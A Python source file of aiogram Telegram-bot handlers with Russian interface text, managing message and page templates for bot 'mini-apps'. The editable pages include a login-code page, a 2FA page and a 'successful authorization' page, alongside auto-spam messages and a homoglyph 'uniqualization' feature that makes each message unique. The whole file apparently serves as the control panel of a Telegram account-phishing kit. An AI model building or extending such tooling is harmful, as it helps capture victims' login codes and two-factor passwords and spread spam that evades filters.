import secrets
from html import escape

from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import (
    copy_template,
    create_template,
    delete_template,
    get_bot,
    get_owner_templates,
    get_template,
    get_template_by_share_code,
    rename_template,
    set_bot_template,
    set_template_share_code,
    update_template_content,
)
from handlers.cards import owns
from handlers.ui import edit_anchor, remember_anchor
from miniapp_template import (
    ALL_DEFAULTS,
    COLORS,
    DEFAULT_VIEW,
    PAGE_FIELDS,
    PAGES,
    PRESETS,
    SHORT_SUBFIELDS,
    VIEWS,
    default_content,
    page_field_key,
)

router = Router()

class TemplateEdit(StatesGroup):
    waiting_for_text = State()
    waiting_for_code = State()
    waiting_for_name = State()

def _ensure_templates(owner_id: int) -> list[dict]:
    templates = get_owner_templates(owner_id)
    if not templates:
        create_template(owner_id, "Стандартный шаблон", "standard", default_content())
        templates = get_owner_templates(owner_id)
    return templates

def _menu_kb(bot: dict, templates: list[dict]) -> InlineKeyboardMarkup:
    bid = bot["id"]
    current = bot.get("template_id")
    b = InlineKeyboardBuilder()
    for t in templates:
        mark = "✅ " if t["id"] == current else ""
        b.row(
            InlineKeyboardButton(
                text=f"{mark}{t['name']}",
                callback_data=f"std_open:{bid}:{t['id']}",
            )
        )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Создать шаблон", callback_data=f"tpl_create:{bid}"
        ),
        InlineKeyboardButton(
            text="➕ Стандартный шаблон", callback_data=f"tpl_new:{bid}"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="💎 Шаблоны мини-апп", callback_data=f"tpl_gallery:{bid}"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="📥 Добавить по коду", callback_data=f"tpl_addcode:{bid}"
        ),
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"bot:{bid}"),
    )
    return b.as_markup()

async def _show_menu(callback: CallbackQuery, bot: dict) -> None:
    templates = _ensure_templates(bot["owner_id"])
    await callback.message.edit_text(
        "📋 <b>Меню шаблонов:</b>", reply_markup=_menu_kb(bot, templates)
    )

_STD_ROWS: list[tuple[str, str]] = [
    ("Ответ на /start", "start_msg"),
    ("Кнопка запуска мини-апп", "start_btn"),
    ("Второе сообщение после /start", "second_msg"),
    ("Просроченный вход", "expired_msg"),
    ("Кнопка просрочки", "expired_btn"),
    ("Успешная авторизация", "auth_ok"),
    ("Автоспам авторизованные", "spam_auth"),
    ("Автоспам неавторизованные", "spam_unauth"),
    ("Пост админ канала", "admin_post"),
    ("Показ успешной авторизации", "show_auth"),
    ("📋 Показ кода", "show_code"),
]

_TEXT_FIELDS: dict[str, str] = {
    "start_msg": "Ответ на /start",
    "second_msg": "Второе сообщение после /start",
    "expired_msg": "Просроченный вход",
    "auth_ok": "Успешная авторизация",
    "admin_post": "Пост админ канала",
    "spam_auth": "Автоспам авторизованные",
    "spam_unauth": "Автоспам неавторизованные",
    "show_auth": "Показ успешной авторизации",
    "show_code": "📋 Показ кода",
}

_BUTTON_FIELDS: dict[str, str] = {
    "start_btn": "Кнопка запуска мини-апп",
    "expired_btn": "Кнопка просрочки",
}

_PAGE_SUBFIELDS: dict[str, tuple[str, str, str]] = {
    page_field_key(page, field): (page, field, f"{PAGES[page]} · {label}")
    for page, fields in PAGE_FIELDS.items()
    for field, label in fields
}

_EDITABLE: dict[str, str] = {
    **_TEXT_FIELDS,
    **_BUTTON_FIELDS,
    **{key: meta[2] for key, meta in _PAGE_SUBFIELDS.items()},
    "bg": "Фон (URL картинки)",
    "app_name": "Название приложения",
    "name": "Название",
}

def _is_button_like(field: str) -> bool:
    if field in _BUTTON_FIELDS or field == "app_name":
        return True
    meta = _PAGE_SUBFIELDS.get(field)
    return bool(meta and meta[1] in SHORT_SUBFIELDS)

def _std_text(template: dict) -> str:
    return f"💎 <b>Шаблон мини-апп «{template['name']}»:</b>"

def _std_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for label, act in _STD_ROWS:
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"std_act:{bid}:{tid}:{act}"
            )
        )
    b.row(
        InlineKeyboardButton(
            text="📱 Страницы мини-апп", callback_data=f"tpl_pages:{bid}:{tid}"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="⚡ Уникализация текста", callback_data=f"std_act:{bid}:{tid}:uniq"
        ),
        InlineKeyboardButton(
            text="📋 Создать копию", callback_data=f"tpl_copy:{bid}:{tid}"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Код шаблона", callback_data=f"std_act:{bid}:{tid}:tcode"
        ),
        InlineKeyboardButton(
            text="🏷 Название", callback_data=f"std_act:{bid}:{tid}:name"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="📲 Название приложения",
            callback_data=f"std_act:{bid}:{tid}:app_name",
        )
    )
    b.row(
        InlineKeyboardButton(
            text="🎨 Оформление бота", callback_data=f"std_act:{bid}:{tid}:design"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="🗑 Удалить шаблон", callback_data=f"tpl_del:{bid}:{tid}"
        )
    )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"template:{bid}"))
    return b.as_markup()

async def _show_editor(callback: CallbackQuery, bid: int, template: dict) -> None:
    await callback.message.edit_text(
        _std_text(template), reply_markup=_std_kb(bid, template["id"])
    )

_PAGE_ROWS: list[tuple[str, str]] = [
    ("Главная страница", "main"),
    ("Страница ввода кода", "code"),
    ("Страница с 2FA", "twofa"),
    ("Страница успешной авторизации", "success"),
    ("🎭 Вид (вёрстка)", "view"),
    ("🖼 Фон", "bg"),
    ("💨 Блюр фона", "blur"),
    ("🎨 Цвет интерфейса", "color"),
]

def _pages_kb(bid: int, tid: int, content: dict) -> InlineKeyboardMarkup:
    blur = int(content.get("blur") or 0)
    b = InlineKeyboardBuilder()
    for label, act in _PAGE_ROWS:
        if act == "blur":
            label = f"💨 Блюр фона: {blur}px"
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"pg_act:{bid}:{tid}:{act}"
            )
        )
    b.row(
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}")
    )
    return b.as_markup()

def _pages_text(template: dict) -> str:
    c = template["content"]
    view = VIEWS.get(c.get("view") or DEFAULT_VIEW, VIEWS[DEFAULT_VIEW])
    color = COLORS.get(c.get("ui_color") or "default", COLORS["default"])[1]
    blur = int(c.get("blur") or 0)
    bg = "установлен" if (c.get("bg") or "").strip() else "не установлен"
    return (
        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>\n\n"
        f"🎭 Вид: <b>{escape(view)}</b>\n"
        f"🎨 Цвет: <b>{escape(color)}</b>\n"
        f"💨 Блюр: <b>{blur}px</b>\n"
        f"🖼 Фон: <b>{bg}</b>"
    )

async def _show_pages(callback: CallbackQuery, bid: int, template: dict) -> None:
    await callback.message.edit_text(
        _pages_text(template),
        reply_markup=_pages_kb(bid, template["id"], template["content"]),
    )

def _page_card_kb(bid: int, tid: int, page: str) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for field, label in PAGE_FIELDS[page]:
        key = page_field_key(page, field)
        b.row(
            InlineKeyboardButton(
                text=label, callback_data=f"pf_act:{bid}:{tid}:{key}"
            )
        )
    b.row(
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tpl_pages:{bid}:{tid}")
    )
    return b.as_markup()

def _page_card_text(page: str, template: dict) -> str:
    lines = [f"💎 <b>{PAGES[page]}</b>", ""]
    for field, label in PAGE_FIELDS[page]:
        value = _field_value(page_field_key(page, field), template).strip()
        shown = escape(value) if value else "<i>не задано</i>"
        lines.append(f"<b>{label}:</b>\n{shown}\n")
    return "\n".join(lines).strip()

async def _show_page_card(
    callback: CallbackQuery, bid: int, template: dict, page: str
) -> None:
    await callback.message.edit_text(
        _page_card_text(page, template),
        reply_markup=_page_card_kb(bid, template["id"], page),
    )

def _colors_kb(bid: int, tid: int, current: str) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    items = list(COLORS.items())
    for i in range(0, len(items), 2):
        row = []
        for cid, (emoji, name) in items[i : i + 2]:
            mark = "✅ " if cid == current else ""
            row.append(
                InlineKeyboardButton(
                    text=f"{mark}{emoji} {name}".strip(),
                    callback_data=f"pgcol:{bid}:{tid}:{cid}",
                )
            )
        b.row(*row)
    b.row(
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tpl_pages:{bid}:{tid}")
    )
    return b.as_markup()

async def _show_colors(callback: CallbackQuery, bid: int, template: dict) -> None:
    current = template["content"].get("ui_color") or "default"
    name = COLORS.get(current, COLORS["default"])[1]
    await callback.message.edit_text(
        "🎨 <b>Цвет интерфейса мини-аппа</b>\n\n"
        f"Текущий: <b>{escape(name)}</b>\n"
        "Выберите цвет:",
        reply_markup=_colors_kb(bid, template["id"], current),
    )

def _views_kb(bid: int, tid: int, current: str) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for vid, name in VIEWS.items():
        mark = "✅ " if vid == current else ""
        b.row(
            InlineKeyboardButton(
                text=f"{mark}{name}", callback_data=f"pgview:{bid}:{tid}:{vid}"
            )
        )
    b.row(
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tpl_pages:{bid}:{tid}")
    )
    return b.as_markup()

async def _show_views(callback: CallbackQuery, bid: int, template: dict) -> None:
    current = template["content"].get("view") or DEFAULT_VIEW
    name = VIEWS.get(current, VIEWS[DEFAULT_VIEW])
    await callback.message.edit_text(
        "🎭 <b>Вид мини-аппа (вёрстка страниц)</b>\n\n"
        f"Текущий: <b>{escape(name)}</b>\n"
        "Выберите оформление страниц:",
        reply_markup=_views_kb(bid, template["id"], current),
    )

@router.callback_query(F.data.startswith("template:"))
async def open_menu(callback: CallbackQuery) -> None:
    bot = get_bot(int(callback.data.split(":")[1]))
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    await _show_menu(callback, bot)
    await callback.answer()

@router.callback_query(F.data.startswith("std_open:"))
async def open_template(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    set_bot_template(bid, tid)
    await _show_editor(callback, bid, template)
    await callback.answer()

@router.callback_query(F.data.startswith("tpl_new:"))
async def new_template(callback: CallbackQuery) -> None:
    bid = int(callback.data.split(":")[1])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    existing = get_owner_templates(callback.from_user.id)
    name = f"Стандартный шаблон {len(existing) + 1}"
    tid = create_template(callback.from_user.id, name, "standard", default_content())
    set_bot_template(bid, tid)
    await _show_editor(callback, bid, get_template(tid))
    await callback.answer("Шаблон создан ✅")

@router.callback_query(F.data.startswith("tpl_copy:"))
async def copy_tpl(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    copy_template(tid)
    await _show_menu(callback, bot)
    await callback.answer("Копия создана ✅")

@router.callback_query(F.data.startswith("tpl_del:"))
async def del_tpl(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    delete_template(tid)
    await _show_menu(callback, bot)
    await callback.answer("Шаблон удалён 🗑")

@router.callback_query(F.data.startswith("tpl_pages:"))
async def open_pages(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    await _show_pages(callback, bid, template)
    await callback.answer()

@router.callback_query(F.data.startswith("pg_act:"))
async def page_action(callback: CallbackQuery) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, act, bot, template = res
    if act == "blur":
        cur = int(template["content"].get("blur") or 0)
        nxt = {0: 4, 4: 8, 8: 12, 12: 0}.get(cur, 0)
        update_template_content(tid, "blur", nxt)
        await _show_pages(callback, bid, get_template(tid))
        await callback.answer(f"Блюр: {nxt}px")
        return
    if act == "color":
        await _show_colors(callback, bid, template)
        await callback.answer()
        return
    if act == "view":
        await _show_views(callback, bid, template)
        await callback.answer()
        return
    if act == "bg":
        await _show_field(callback, bid, template, "bg")
        await callback.answer()
        return
    if act in PAGES:
        await _show_page_card(callback, bid, template, act)
        await callback.answer()
        return
    await callback.answer("🚧 В разработке", show_alert=True)

@router.callback_query(F.data.startswith("pgcard:"))
async def open_page_card(callback: CallbackQuery) -> None:
    _, bid_s, tid_s, page = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    if page not in PAGES:
        await callback.answer("Лист не найден.", show_alert=True)
        return
    await _show_page_card(callback, bid, template, page)
    await callback.answer()

@router.callback_query(F.data.startswith("pf_act:"))
async def page_field_action(callback: CallbackQuery) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, field, bot, template = res
    if field not in _PAGE_SUBFIELDS:
        await callback.answer("Поле не найдено.", show_alert=True)
        return
    await _show_field(callback, bid, template, field)
    await callback.answer()

@router.callback_query(F.data.startswith("pgcol:"))
async def set_color(callback: CallbackQuery) -> None:
    _, bid_s, tid_s, cid = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    if cid not in COLORS:
        await callback.answer("Неизвестный цвет.", show_alert=True)
        return
    update_template_content(tid, "ui_color", cid)
    await _show_colors(callback, bid, get_template(tid))
    await callback.answer(f"Цвет: {COLORS[cid][1]}")

@router.callback_query(F.data.startswith("pgview:"))
async def set_view(callback: CallbackQuery) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, vid, bot, template = res
    if vid not in VIEWS:
        await callback.answer("Неизвестный вид.", show_alert=True)
        return
    update_template_content(tid, "view", vid)
    await _show_views(callback, bid, get_template(tid))
    await callback.answer(f"Вид: {VIEWS[vid]}")

def _field_value(field: str, template: dict) -> str:
    if field == "name":
        return template["name"]
    val = template["content"].get(field)
    if val is None:

        return ALL_DEFAULTS.get(field, "")
    return val

def _field_kb(bid: int, tid: int, field: str, has_value: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(
            text="✏️ Изменить", callback_data=f"fld_edit:{bid}:{tid}:{field}"
        )
    )

    if has_value and field != "name":
        b.row(
            InlineKeyboardButton(
                text="🗑 Очистить", callback_data=f"fld_clr:{bid}:{tid}:{field}"
            )
        )

    if field in _PAGE_SUBFIELDS:
        back = f"pgcard:{bid}:{tid}:{_PAGE_SUBFIELDS[field][0]}"
    elif field == "bg":
        back = f"tpl_pages:{bid}:{tid}"
    else:
        back = f"std_open:{bid}:{tid}"
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=back))
    return b.as_markup()

def _field_text(field: str, template: dict) -> str:
    label = _EDITABLE[field]
    value = _field_value(field, template).strip()
    if field in ("name", "app_name"):
        kind = "Название"
    elif _is_button_like(field):
        kind = "Значение"
    else:
        kind = "Текст"
    if value:
        body = f"Текущее значение:\n\n<code>{escape(value)}</code>"
    else:
        body = f"{kind} пока не задан."
    return f"✏️ <b>{label}</b>\n\n{body}"

async def _show_field(callback: CallbackQuery, bid: int, template: dict, field: str) -> None:
    has_value = bool(_field_value(field, template).strip())
    await callback.message.edit_text(
        _field_text(field, template),
        reply_markup=_field_kb(bid, template["id"], field, has_value),
    )

def _resolve(callback: CallbackQuery) -> tuple[int, int, str, dict, dict] | None:
    parts = callback.data.split(":")
    bid, tid, field = int(parts[1]), int(parts[2]), parts[3]
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        return None
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        return None
    return bid, tid, field, bot, template

def _uniq_text(content: dict) -> str:
    enabled = bool(content.get("uniq_enabled"))
    mode = content.get("uniq_mode") or "hard"
    return (
        "⚡ <b>Уникализация текста</b>\n\n"
        "Подменяет часть букв на похожие Unicode-символы, чтобы каждое "
        "сообщение бота было уникальным (ссылки и HTML-теги не трогаются).\n\n"
        f"Статус: <b>{'включена 🟢' if enabled else 'выключена 🔴'}</b>\n"
        f"Режим: <b>{'жёсткий' if mode == 'hard' else 'лёгкий'}</b>"
    )

def _uniq_kb(bid: int, tid: int, content: dict) -> InlineKeyboardMarkup:
    enabled = bool(content.get("uniq_enabled"))
    mode = content.get("uniq_mode") or "hard"
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(
            text="🔴 Выключить" if enabled else "🟢 Включить",
            callback_data=f"uniq_tog:{bid}:{tid}",
        )
    )
    b.row(
        InlineKeyboardButton(
            text=f"Режим: {'жёсткий' if mode == 'hard' else 'лёгкий'}",
            callback_data=f"uniq_mode:{bid}:{tid}",
        )
    )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}"))
    return b.as_markup()

async def _show_uniq(callback: CallbackQuery, bid: int, template: dict) -> None:
    await callback.message.edit_text(
        _uniq_text(template["content"]),
        reply_markup=_uniq_kb(bid, template["id"], template["content"]),
    )

@router.callback_query(F.data.startswith("std_act:"))
async def std_action(callback: CallbackQuery) -> None:
    field = callback.data.split(":")[3]
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, field, bot, template = res
    if field in _EDITABLE:
        await _show_field(callback, bid, template, field)
        await callback.answer()
        return
    if field == "uniq":
        await _show_uniq(callback, bid, template)
        await callback.answer()
        return
    if field == "tcode":
        await _show_code(callback, bid, template)
        await callback.answer()
        return
    if field == "design":

        await _show_pages(callback, bid, template)
        await callback.answer()
        return
    await callback.answer("🚧 В разработке", show_alert=True)

def _code_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(
            text="🔄 Обновить код", callback_data=f"tcode_new:{bid}:{tid}"
        )
    )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}"))
    return b.as_markup()

async def _show_code(callback: CallbackQuery, bid: int, template: dict) -> None:
    code = template.get("share_code")
    if not code:
        code = secrets.token_urlsafe(6)
        set_template_share_code(template["id"], code)
    await callback.message.edit_text(
        "⚙️ <b>Код шаблона</b>\n\n"
        "Передайте этот код другому владельцу — он сможет добавить копию "
        "шаблона через «📥 Добавить по коду».\n\n"
        f"<code>{escape(code)}</code>",
        reply_markup=_code_kb(bid, template["id"]),
    )

@router.callback_query(F.data.startswith("tcode_new:"))
async def code_regen(callback: CallbackQuery) -> None:
    res = _resolve_bt(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, template = res
    set_template_share_code(tid, secrets.token_urlsafe(6))
    await _show_code(callback, bid, get_template(tid))
    await callback.answer("Код обновлён 🔄")

def _resolve_bt(callback: CallbackQuery) -> tuple[int, int, dict] | None:
    parts = callback.data.split(":")
    bid, tid = int(parts[1]), int(parts[2])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        return None
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        return None
    return bid, tid, template

@router.callback_query(F.data.startswith("tpl_create:"))
async def create_template_start(callback: CallbackQuery, state: FSMContext) -> None:
    bid = int(callback.data.split(":")[1])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    await state.set_state(TemplateEdit.waiting_for_name)
    await state.update_data(bid=bid)
    await remember_anchor(callback, state)
    await callback.message.edit_text(
        "⚙️ <b>Создание шаблона</b>\n\nПришлите название нового шаблона:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=f"template:{bid}")]
            ]
        ),
    )
    await callback.answer()

@router.message(TemplateEdit.waiting_for_name, F.text)
async def create_template_save(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    await state.clear()
    bid = data.get("bid")
    name = message.text.strip()[:60] or "Новый шаблон"
    tid = create_template(message.from_user.id, name, "standard", default_content())
    if bid:
        set_bot_template(bid, tid)
    template = get_template(tid)
    if template is None:
        return

    await edit_anchor(
        message, data, _std_text(template), _std_kb(bid, template["id"])
    )

@router.callback_query(F.data.startswith("tpl_gallery:"))
async def gallery(callback: CallbackQuery) -> None:
    bid = int(callback.data.split(":")[1])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    b = InlineKeyboardBuilder()
    for p in PRESETS:
        b.row(
            InlineKeyboardButton(
                text=f"💎 {p['name']}", callback_data=f"tpl_use:{bid}:{p['id']}"
            )
        )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"template:{bid}"))
    await callback.message.edit_text(
        "💎 <b>Шаблоны мини-апп</b>\n\n"
        "Готовые шаблоны со своими текстами. Выберите — добавится копия, "
        "её можно дальше редактировать:",
        reply_markup=b.as_markup(),
    )
    await callback.answer()

@router.callback_query(F.data.startswith("tpl_use:"))
async def use_preset(callback: CallbackQuery) -> None:
    _, bid_s, pid = callback.data.split(":")
    bid = int(bid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    preset = next((p for p in PRESETS if p["id"] == pid), None)
    if preset is None:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    tid = create_template(
        callback.from_user.id, preset["name"], "standard", preset["content"]
    )
    set_bot_template(bid, tid)
    await _show_editor(callback, bid, get_template(tid))
    await callback.answer("Шаблон добавлен ✅")

@router.callback_query(F.data.startswith("tpl_addcode:"))
async def add_by_code(callback: CallbackQuery, state: FSMContext) -> None:
    bid = int(callback.data.split(":")[1])
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    await state.set_state(TemplateEdit.waiting_for_code)
    await state.update_data(bid=bid)
    await remember_anchor(callback, state)
    await callback.message.edit_text(
        "📥 Пришлите код шаблона, которым с вами поделились:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=f"template:{bid}")]
            ]
        ),
    )
    await callback.answer()

@router.message(TemplateEdit.waiting_for_code, F.text)
async def code_save(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    await state.clear()
    bid = data.get("bid")
    code = message.text.strip()
    src = get_template_by_share_code(code)
    if src is None:
        bot = get_bot(bid) if bid else None
        templates = _ensure_templates(message.from_user.id) if bot else []
        await edit_anchor(
            message,
            data,
            "❌ Шаблон с таким кодом не найден.\n\n📋 <b>Меню шаблонов:</b>",
            _menu_kb(bot, templates) if bot else None,
        )
        return

    new_id = create_template(
        message.from_user.id, src["name"], src["kind"], src["content"]
    )
    if bid:
        set_bot_template(bid, new_id)
    bot = get_bot(bid) if bid else None
    templates = _ensure_templates(message.from_user.id) if bot else []
    await edit_anchor(
        message,
        data,
        "✅ Шаблон добавлен!\n\n📋 <b>Меню шаблонов:</b>",
        _menu_kb(bot, templates) if bot else None,
    )

@router.callback_query(F.data.startswith("uniq_tog:"))
async def uniq_toggle(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    update_template_content(tid, "uniq_enabled", not template["content"].get("uniq_enabled"))
    await _show_uniq(callback, bid, get_template(tid))
    await callback.answer()

@router.callback_query(F.data.startswith("uniq_mode:"))
async def uniq_switch_mode(callback: CallbackQuery) -> None:
    _, bid_s, tid_s = callback.data.split(":")
    bid, tid = int(bid_s), int(tid_s)
    bot = get_bot(bid)
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    template = get_template(tid)
    if template is None or template["owner_id"] != callback.from_user.id:
        await callback.answer("Шаблон не найден.", show_alert=True)
        return
    new_mode = "light" if (template["content"].get("uniq_mode") or "hard") == "hard" else "hard"
    update_template_content(tid, "uniq_mode", new_mode)
    await _show_uniq(callback, bid, get_template(tid))
    await callback.answer()

@router.callback_query(F.data.startswith("fld_edit:"))
async def field_edit(callback: CallbackQuery, state: FSMContext) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, field, bot, template = res
    await state.set_state(TemplateEdit.waiting_for_text)
    await state.update_data(bid=bid, tid=tid, field=field)
    await remember_anchor(callback, state)
    if field == "name":
        hint = "Пришлите новое название шаблона:"
    elif _is_button_like(field):
        hint = f"Пришлите значение для «{escape(_EDITABLE[field])}»:"
    else:
        hint = (
            f"Пришлите новый текст для «{escape(_EDITABLE[field])}».\n\n"
            "Можно с HTML-разметкой (&lt;b&gt;, &lt;i&gt;, &lt;a&gt; …)."
        )

    if field in _PAGE_SUBFIELDS:
        cancel = f"pf_act:{bid}:{tid}:{field}"
    elif field == "bg":
        cancel = f"pg_act:{bid}:{tid}:bg"
    else:
        cancel = f"std_act:{bid}:{tid}:{field}"
    await callback.message.edit_text(
        f"✏️ {hint}",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Отмена", callback_data=cancel)]
            ]
        ),
    )
    await callback.answer()

@router.callback_query(F.data.startswith("fld_clr:"))
async def field_clear(callback: CallbackQuery) -> None:
    res = _resolve(callback)
    if res is None:
        await callback.answer("Не найдено.", show_alert=True)
        return
    bid, tid, field, bot, template = res
    update_template_content(tid, field, "")
    await _show_field(callback, bid, get_template(tid), field)
    await callback.answer("Очищено 🗑")

@router.message(TemplateEdit.waiting_for_text, F.text)
async def field_save(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    await state.clear()
    bid, tid, field = data.get("bid"), data.get("tid"), data.get("field")
    if tid is None or field is None:
        return
    if field == "name":
        rename_template(tid, message.text.strip()[:60])
    elif _is_button_like(field):

        update_template_content(tid, field, message.text.strip()[:64])
    else:

        update_template_content(tid, field, message.html_text or message.text)
    template = get_template(tid)
    if template is None:
        return
    has_value = bool(_field_value(field, template).strip())
    await edit_anchor(
        message,
        data,
        _field_text(field, template),
        _field_kb(bid, tid, field, has_value),
    )

@router.callback_query(F.data.startswith("tpl_soon:"))
async def not_ready(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)
